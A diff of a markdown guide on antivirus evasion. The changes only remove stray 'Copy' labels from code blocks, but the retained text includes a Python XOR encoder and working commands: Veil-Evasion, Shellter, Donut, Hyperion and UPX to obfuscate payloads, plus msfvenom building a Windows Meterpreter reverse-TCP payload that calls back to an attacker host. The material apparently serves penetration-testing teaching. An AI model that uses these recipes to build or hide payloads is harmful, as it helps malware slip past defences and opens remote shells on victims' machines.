@@ -1330,10 +1330,6 @@ asciinema rec session.cast
 
 -   **Example: XOR Encoder in Python**:
 
-    python
-
-    Copy
-
     def xor_encode(data, key):
         return bytes([b ^ key for b in data])
 
@@ -1360,10 +1356,6 @@ Metasploit has other encoders that are less commonly used and may evade detectio
 
 You can list all available encoders in Metasploit:
 
-bash
-
-Copy
-
 msfvenom --list encoders
 
 * * * * *
@@ -1380,10 +1372,6 @@ As mentioned earlier, **Veil-Evasion** is a powerful tool for generating AV-ev
 
 **Example**:
 
-bash
-
-Copy
-
 ./Veil-Evasion.py
 > use go/meterpreter/rev_tcp
 > set LHOST 192.168.1.100
@@ -1398,10 +1386,6 @@ Copy
 
 **Example**:
 
-bash
-
-Copy
-
 shellter
 > Select a target executable (e.g., notepad.exe)
 > Inject Meterpreter payload
@@ -1414,10 +1398,6 @@ shellter
 **Donut** generates position-independent shellcode from .NET assemblies, VBScript, JScript, or EXE files. This shellcode can be embedded into custom loaders or scripts.
 
 **Example**:
-
-bash
-
-Copy
 
 ./donut -f payload.exe -o shellcode.bin
 
@@ -1455,17 +1435,9 @@ Crypters and packers encrypt or compress the payload, making it harder for AV to
 
 -   **Hyperion**: A runtime crypter for 32-bit executables.
 
-    bash
-
-    Copy
-
     wine hyperion.exe payload.exe encrypted_payload.exe
 
 -   **UPX**: A packer that compresses executables though its often detected by AVs.
-
-    bash
-
-    Copy
 
     upx -9 payload.exe -o packed_payload.exe
 
@@ -1476,10 +1448,6 @@ Crypters and packers encrypt or compress the payload, making it harder for AV to
 Staged payloads split the payload into smaller parts, making it harder for AV to detect the full malicious code.
 
 **Example**:
-
-bash
-
-Copy
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -f exe -o stage1.exe
 
